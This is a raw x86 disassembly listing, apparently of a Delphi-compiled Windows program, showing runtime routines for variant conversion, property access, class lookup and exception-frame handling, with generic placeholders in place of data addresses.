lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403e78
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_40454c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403e78
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f870
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404570
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404680
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e4c0
test ah 0x40
je r-xdata
mov eax esi
call sub_404534
mov edx eax
mov eax ebx
call sub_40f8d4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f7b8
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404570
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f7b8
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404570
jmp r-xdata
jmp [ eax * 4 + jump_table_40fc5d ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d78
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404680
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407d78
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404680
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40930c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404680
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40930c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404680
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40ef8c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404570
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40efc4
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404570
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404644
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40effc
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404570
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d78
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404680
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d78
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404680
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d78
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404680
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_407e64
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404680
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_407e64
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404680
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f99c
jmp r-xdata
sub_40fefc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40eba4
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_40ff38
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40eba4
sub_40ff64
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40eba4
sub_40ffc8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403ea8
pop esi
pop ebx
retn
mov eax ebx
call sub_40eba4
sub_40fff4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404730
pop esi
pop ebx
retn
mov eax ebx
call sub_40eba4
sub_4101b0
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4102d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403ea8
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403ea8
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41060c
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403ea8
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404160
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_407e8c
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404160
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403054
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402854
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4040b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4102dd
lea eax [ ebp - 0x208 ]
call sub_403e54
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404160
sub_410358
inc [ eax + 0x80040df ]
push esi
popad
jb r-xdata
xor al 0xff
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_41060c
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_41058c
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_410368
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4103c9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404c4c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4103d0
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403104
sub_410418
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_41058c
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_41060c
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41046c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4104a4
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_41058c
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4104e0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403490
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_410543
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41054a
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4105e4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031b8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41060c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4106b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404c4c
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4106c4
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41079a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41077d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404c54
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410784
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403054
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4040b8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407b44
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4107b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410823
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41082a
retn
call sub_410368
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e14
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
call sub_403e54
mov eax rw-data
call sub_40ec34
sub_41082c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4108cd
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4108d4
retn
mov eax rw-data
call sub_410338
mov eax sub_40e934
mov [ rw-data ] eax
mov eax sub_40e55c
mov [ rw-data ] eax
mov edx sub_40e46c
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40ec34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_41002c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ef48
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f274
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f99c
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4108d8
xchg [ fs : esi ] al
lodsd [ esi ]
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ esi + 0x640000ff ] ch
xchg [ esi ] al
scasd [ edi ]
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax + 0x640000ff ] dl
xchg [ esi ] al
xchg ecx eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx + 0x640000ff ] dl
xchg [ esi ] al
xchg ebx eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 - 0x799c0000 ] dl
inc esi
add [ ebp + 0x640000ff ] dl
xchg [ esi ] al
xchg esi eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + 0x640000ff ] dl
xchg [ esi ] al
cwde
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx + 0x640000ff ] bl
xchg [ esi ] al
0x640000ff 0x4686
add [ ebx + 0x640000ff ] bl
xchg [ esi ] al
pushfd
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp + 0x640000ff ] bl
xchg [ esi ] al
sahf
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + 0x640000ff ] bl
xchg [ esi ] al
cmp bh 0x0
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx + 0x640000ff ] al
xchg [ esi ] al
cmp bh 0x0
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx + 0x640000ff ] al
xchg [ esi ] al
test bh bh
add [ eax ] al
xchg [ fs : esi ] al
test edi edi
add [ eax ] al
xchg [ fs : esi ] al
xchg bh bh
add [ eax ] al
xchg [ fs : esi ] al
xchg edi edi
add [ eax ] al
xchg [ fs : esi ] al
mov bh bh
add [ eax ] al
xchg [ fs : esi ] al
mov edi edi
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4109e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4109ec
retn
sub_410a30
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_410a7c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_410a24
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_407eb4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_410a30
mov edx [ rw-data ]
mov eax esi
call sub_407b44
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407b44
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_407eb4
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_410ae0
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_410b50
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_410bc4
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_410c20
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410c74
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4040f0
mov ecx esp
mov edx esi
mov eax ebx
call sub_410c20
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_410cbc
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410ca8
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410cfc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410d44
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404680
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_410d80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410d4b
lea eax [ ebp - 0x4 ]
call sub_404534
retn
sub_410d54
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_410c74
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_410cbc
pop ebx
retn
dec bl
je r-xdata
call sub_410cfc
jmp r-xdata
pop ebx
retn
sub_410d80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410e46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4040dc
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_410d54
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e4d
lea eax [ ebp - 0xc ]
call sub_403e54
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404570
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410e54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_410a24
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_410e9c ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410fcb ]
jmp [ eax * 4 + jump_table_410f38 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_411060
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_41104c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4110a0
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_4110d8
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_411114
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_40550c
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
